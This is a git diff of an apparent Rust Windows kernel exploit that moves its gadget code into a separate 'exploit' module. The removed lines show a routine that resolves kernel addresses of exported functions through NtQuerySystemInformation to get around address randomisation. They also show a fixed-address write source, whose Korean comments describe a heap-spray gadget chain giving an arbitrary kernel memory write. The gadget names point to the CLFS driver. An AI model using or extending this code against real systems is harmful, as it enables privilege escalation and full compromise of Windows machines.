@@ -41,6 +41,13 @@ use std::mem::offset_of;
 
 mod ntdll;
 mod helper;
+mod exploit;
+
+use exploit::kernel_gadget::{
+    KernelGadget,
+    KernelWriteSource,
+};
+
 
 use ntdll::system_infomation::{
     big_pool::{
@@ -1117,125 +1124,10 @@ struct Pipeline {
     write_pipe: HANDLE
 }
 
-struct KernelGadget {
-    rva: usize,
-    kernel_addr: usize,
-}
 
-impl KernelGadget {
-    fn new(path: &str, name: &[u8]) -> Option<Self> {
-        let wide_path = str_helper::wide(path);
-
-        let user_base = unsafe {
-            LoadLibraryExW(
-                wide_path.as_ptr(),
-                std::ptr::null_mut(),
-                DONT_RESOLVE_DLL_REFERENCES,
-            )
-        };
-
-        if user_base.is_null() {
-            return None;
-        }
-
-        let user_addr = unsafe {
-            GetProcAddress(
-                user_base,
-                name.as_ptr(),
-            )
-        }?;
-
-        let rva =
-            user_addr as usize
-            - user_base as usize;
-
-
-        let mut buffer_size = 0u32;
-        let mut buffer = Vec::<u8>::new();
-
-        buffer.resize(10, 0);
-        loop {
-            let status = unsafe {
-                NtQuerySystemInformation(
-                    SystemInformationClass::SystemModuleInformation,
-                    buffer.as_mut_ptr().cast::<c_void>(),
-                    buffer_size,
-                    &mut buffer_size,
-                )
-            };
-
-            if status == STATUS_INFO_LENGTH_MISMATCH {
-                buffer.resize(buffer_size as usize, 0);
-                continue;
-            }
-
-            if status < 0 {
-                return None;
-            }
-
-            break;
-        }
-
-
-        let info = unsafe {
-            &*(buffer.as_ptr() as *const RtlProcessModules)
-        };
-
-        let wanted_name =
-            path.rsplit(['\\', '/']).next()?.as_bytes();
-
-        for i in 0..info.number_of_modules as usize {
-            let entry = unsafe {
-                &*info.modules.as_ptr().add(i)
-            };
-
-            let end = entry
-                .full_path_name
-                .iter()
-                .position(|&c| c == 0)
-                .unwrap_or(entry.full_path_name.len());
-
-            let start =
-                entry.offset_to_file_name as usize;
-
-            let file_name =
-                &entry.full_path_name[start..end];
-
-            if file_name.eq_ignore_ascii_case(wanted_name) {
-                let kernel_base =
-                    entry.image_base as usize;
-
-                return Some(Self {
-                    rva,
-                    kernel_addr: kernel_base + rva,
-                });
-            }
-        }
-        None
-    }
-}
-
-struct ExploitGadgets {
+pub struct ExploitGadgets {
     clfs_earlier_lsn: KernelGadget,
     se_set_access_state_generic_mapping: KernelGadget,
-}
-
-//Gadget이 읽을 고정적인 메모리주소
-//  rax = [rcx + 0x48] 단계에서, heapspray에서 뿌려둔 커널 주소가 rax에 들어간다.
-//  xmm0 = [rdx].o 에서 rdx는 이전 side effect로 인해 해당 구조체에서 설정한 고정주소에 들어간다.
-//  [rax + 8].o = xmm0 로인해, 커널 메모리에 rdx주소에 있는 값에 쓰기가 일어난다.
-struct KernelWriteSource;
-
-impl KernelWriteSource {
-    const BASE: usize = 0xFFFF_FFFF;
-    const SECOND_QWORD: usize = Self::BASE + 8;
-
-    unsafe fn set(first: u64, second: u64) {
-        unsafe {
-            std::ptr::write_unaligned(Self::BASE as *mut u64, first);
-            std::ptr::write_unaligned(Self::SECOND_QWORD as *mut u64, second);
-        }
-    }
 }
 
 
